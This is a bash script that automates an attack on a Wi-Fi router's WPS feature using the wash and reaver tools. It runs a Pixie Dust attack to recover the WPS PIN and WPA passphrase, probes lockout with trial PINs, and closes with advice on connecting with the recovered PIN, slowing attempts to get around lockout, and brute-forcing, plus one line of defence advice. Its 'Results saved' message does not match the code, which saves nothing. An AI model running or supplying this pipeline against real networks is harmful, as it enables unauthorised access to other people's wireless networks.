#!/bin/bash
# wps-attack.sh - Automated WPS vulnerability assessment
# Usage: sudo ./wps-attack.sh <bssid> <channel> [interface]

BSSID=$1
CHANNEL=$2
INTERFACE=${3:-wlan0mon}

print_usage() {
    cat << EOF
Usage: sudo $0 <BSSID> <CHANNEL> [INTERFACE]

Automated WPS attack pipeline:
1. Check if WPS is enabled
2. Test Pixie Dust vulnerability
3. Attempt PIN recovery
4. Generate WPA passphrase

Example: sudo $0 AA:BB:CC:DD:EE:FF 6 wlan0mon
EOF
}

check_prerequisites() {
    if [ $# -lt 2 ]; then
        print_usage
        exit 1
    fi
    
    if [ "$EUID" -ne 0 ]; then
        echo "[!] Must run as root"
        exit 1
    fi
    
    for cmd in wash reaver; do
        if ! command -v $cmd &> /dev/null; then
            echo "[!] $cmd not found. Install reaver: sudo apt install reaver"
            exit 1
        fi
    done
}

check_wps_status() {
    echo "[+] Checking WPS status on $BSSID..."
    
    local wps_info
    wps_info=$(timeout 30 wash -i "$INTERFACE" 2>/dev/null | grep "$BSSID" || true)
    
    if [ -z "$wps_info" ]; then
        echo "[!] Target not found in WPS scan"
        echo "[!] WPS may be disabled or target unreachable"
        return 1
    fi
    
    echo "[+] WPS Enabled: YES"
    echo "[+] Details: $wps_info"
    return 0
}

test_pixie_dust() {
    echo ""
    echo "[+] Testing Pixie Dust vulnerability..."
    echo "[+] This may take up to 2 minutes..."
    
    local pixie_output
    pixie_output=$(mktemp)
    
    timeout 120 reaver -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -K 1 -vv 2>&1 | tee "$pixie_output"
    
    if grep -q "WPS PIN" "$pixie_output"; then
        echo ""
        echo "[+] VULNERABLE TO PIXIE DUST!"
        grep "WPS PIN" "$pixie_output"
        grep "WPA PSK" "$pixie_output" 2>/dev/null || true
        rm -f "$pixie_output"
        return 0
    fi
    
    rm -f "$pixie_output"
    return 1
}

test_online_brute() {
    echo ""
    echo "[!] Pixie Dust failed or not applicable"
    echo "[+] Testing online brute-force resistance..."
    echo "[+] Attempting 5 PINs to detect lockout behavior..."
    
    local pin
    local attempts=0
    local max_attempts=5
    
    # Test with obviously wrong PINs
    for pin in 00000000 11111111 22222222 33333333 44444444; do
        attempts=$((attempts + 1))
        echo "[+] Attempt $attempts/$max_attempts: PIN $pin"
        
        local result
        result=$(timeout 30 reaver -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -p "$pin" -vv 2>&1)
        
        if echo "$result" | grep -qi "locked"; then
            echo "[!] AP locked after $attempts attempts"
            echo "[+] Lockout behavior detected"
            return 0
        fi
        
        if echo "$result" | grep -q "WPS PIN"; then
            echo "[+] PIN FOUND: $pin"
            return 0
        fi
        
        sleep 2
    done
    
    echo "[!] No lockout detected in $max_attempts attempts"
    echo "[+] AP may be vulnerable to extended brute force"
    return 1
}

print_recommendations() {
    echo ""
    echo "=========================================="
    echo "  Assessment Complete"
    echo "=========================================="
    echo ""
    echo "Results saved. Next steps:"
    echo ""
    echo "1. If Pixie Dust successful:"
    echo "   - Use recovered PIN to connect"
    echo "   - Or use 'reaver -p <PIN>' to get passphrase"
    echo ""
    echo "2. If lockout detected:"
    echo "   - Use delays: reaver -d 60 -r 3:300"
    echo "   - Slow attack over extended period"
    echo ""
    echo "3. If no lockout:"
    echo "   - Full brute force viable"
    echo "   - Estimated time: 4-10 hours average"
    echo ""
    echo "4. Defense recommendation:"
    echo "   - Disable WPS on router"
    echo "   - Only complete mitigation"
}

main() {
    check_prerequisites "$@"
    
    echo "=========================================="
    echo "  WPS Vulnerability Assessment"
    echo "=========================================="
    echo "Target: $BSSID"
    echo "Channel: $CHANNEL"
    echo ""
    
    if ! check_wps_status; then
        exit 1
    fi
    
    if test_pixie_dust; then
        print_recommendations
        exit 0
    fi
    
    test_online_brute
    print_recommendations
}

trap 'echo ""; echo "[!] Interrupted"; exit 130' INT

main "$@"
